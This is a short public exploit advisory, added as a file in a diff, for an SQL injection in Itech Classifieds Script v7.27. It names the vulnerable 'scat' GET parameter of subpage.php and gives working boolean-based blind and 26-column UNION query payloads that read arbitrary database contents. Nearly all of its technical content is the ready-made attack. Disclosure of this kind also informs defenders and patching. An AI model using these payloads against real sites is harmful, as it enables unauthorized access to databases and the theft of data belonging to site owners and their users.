@@ -1,0 +1,30 @@
+Exploit Title: Itech Classifieds Script v7.27 – SQL Injection
+Date: 30.01.2017
+Vendor Homepage: http://itechscripts.com/
+Software Link: http://itechscripts.com/classifieds-script/
+Exploit Author: Kaan KAMIS
+Contact: iletisim[at]k2an[dot]com
+Website: http://k2an.com
+Category: Web Application Exploits
+
+Overview
+
+Classifieds Script v7.27 is the best classifieds software. Try this script and present yourself with a robust digital platform.
+
+Type of vulnerability:
+
+An SQL Injection vulnerability in Classifieds Script v7.27 allows attackers to read
+arbitrary data from the database.
+
+Vulnerability:
+
+URL : http://localhost/subpage.php?scat=51[payload]
+
+Parameter: scat (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: scat=51' AND 4941=4941 AND 'hoCP'='hoCP
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 26 columns
+    Payload: scat=51' UNION ALL SELECT CONCAT(0x7162787871,0x6d4d4d63544378716c72467441784342664b4a6f424d615951594f476c53465070635545505a7558,0x716b767671),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- SKES
